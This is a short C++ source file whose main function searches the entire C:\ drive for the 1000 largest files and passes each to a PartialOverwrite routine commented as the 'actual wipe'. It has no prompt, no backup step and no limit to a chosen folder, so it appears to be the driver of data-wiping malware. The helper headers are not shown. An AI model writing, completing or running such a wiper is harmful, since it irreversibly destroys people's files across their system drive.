#include "findFiles.h"
#include "wipe.h"

int main() {
    const std::string startPath = "C:\\";
    const int fileCount = 1000;

    std::cout << "\nStarting search in: " << startPath << std::endl;

    try {
        std::vector<FileInfo> Files = FindLargestFiles(startPath, fileCount);
        std::cout << "\nSearch complete." << std::endl;

        for (int i = 0; i < Files.size(); i++) {
            
            // Type conversiion
            std::wstring wpath = std::wstring(Files[i].path.begin(), Files[i].path.end());
            const wchar_t* wcpath = wpath.c_str();

            // Actual wipe
            PartialOverwrite(wcpath, Files[i].size);
        }
    }
    catch (const std::exception& err) {
        std::cerr << "An error occurred: " << err.what() << std::endl;
        return 1;
    }

    return 0;
}